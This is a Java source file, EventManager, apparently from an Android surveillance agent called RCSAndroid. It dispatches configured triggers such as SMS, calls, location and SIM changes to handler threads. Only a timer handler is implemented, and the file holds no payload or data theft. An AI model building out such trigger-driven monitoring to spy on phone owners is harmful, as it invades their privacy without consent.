/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.event;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.agent.AgentBase;
import com.ht.RCSAndroidGUI.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public class EventManager extends Manager {

	/** The Constant TAG. */
	private static final String TAG = "EventManager";

	/** The singleton. */
	private volatile static EventManager singleton;

	/** The status obj. */
	private final Status statusObj;

	/** The running. */
	private final HashMap<Integer, EventBase> running;
	private HashMap<EventBase, Thread> threads;

	/**
	 * Self.
	 * 
	 * @return the event manager
	 */
	public static EventManager self() {
		if (singleton == null) {
			synchronized (EventManager.class) {
				if (singleton == null) {
					singleton = new EventManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * Instantiates a new event manager.
	 */
	private EventManager() {
		statusObj = Status.self();

		running = new HashMap<Integer, EventBase>();
		threads = new HashMap<EventBase, Thread>();
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private EventBase mapEvent(final int key) {
		EventBase e = null;

		if (running.containsKey(key) == true) {
			return running.get(key);
		}

		switch (key) {
		case Event.EVENT_TIMER:
			Log.i(TAG, "");
			e = new TimerEvent();
			break;

		case Event.EVENT_SMS:
			Log.i(TAG, "EVENT_SMS");
			break;

		case Event.EVENT_CALL:
			Log.i(TAG, "EVENT_CALL");
			break;

		case Event.EVENT_CONNECTION:
			Log.i(TAG, "EVENT_CONNECTION");
			break;

		case Event.EVENT_PROCESS:
			Log.i(TAG, "EVENT_PROCESS");
			break;

		case Event.EVENT_CELLID:
			Log.i(TAG, "EVENT_CELLID");
			break;

		case Event.EVENT_QUOTA:
			Log.i(TAG, "EVENT_QUOTA");
			break;

		case Event.EVENT_SIM_CHANGE:
			Log.i(TAG, "EVENT_SIM_CHANGE");
			break;

		case Event.EVENT_LOCATION:
			Log.i(TAG, "EVENT_LOCATION");
			break;

		case Event.EVENT_AC:
			Log.i(TAG, "EVENT_AC");
			break;

		case Event.EVENT_BATTERY:
			Log.i(TAG, "EVENT_BATTERY");
			break;

		case Event.EVENT_STANDBY:
			Log.i(TAG, "EVENT_STANDBY");
			break;

		default:
			Log.e(TAG, "Unknown: " + key);
			break;
		}

		if (e != null) {
			running.put(key, e);
		}

		return e;
	}

	/**
	 * Start events.
	 * 
	 * @return true, if successful
	 */
	public boolean startEvents() {
		HashMap<Integer, Event> events;

		events = statusObj.getEventsMap();

		if (events == null) {
			Log.d("RCS", "Events map null");
			return false;
		}

		if (running == null) {
			Log.d("RCS", "Running Events map null");
			return false;
		}

		final Iterator<Map.Entry<Integer, Event>> it = events.entrySet()
				.iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, Event> pairs = it.next();
			final int key = pairs.getValue().getType();
			final EventBase e = mapEvent(key);

			if (e != null) {

				e.parse(pairs.getValue());
				if (e.getStatus() != Event.EVENT_RUNNING) {
					Thread t = new Thread(e);
					t.start();
					threads.put(e, t);

				} else {
					Log.w(TAG, "event already running");
				}
			}
		}

		return true;
	}

	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	/**
	 * Stop events.
	 */
	public void stopEvents() {
		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet()
				.iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventBase> pairs = it.next();
			EventBase event = pairs.getValue();

			Log.d(TAG, "Stopping: " + event);

			if (event.getStatus() == Event.EVENT_RUNNING) {
				event.stopThread();
				try {
					Thread t = threads.get(event);
					Check.asserts(t != null, "Null thread");

					t.join();
					threads.remove(event);

				} catch (InterruptedException e) {
					e.printStackTrace();
					Log.e(TAG, e.toString());
				}
			} else {
				Check.asserts(threads.get(event) == null,
						"Shouldn't find a thread");
			}

		}
	}
}
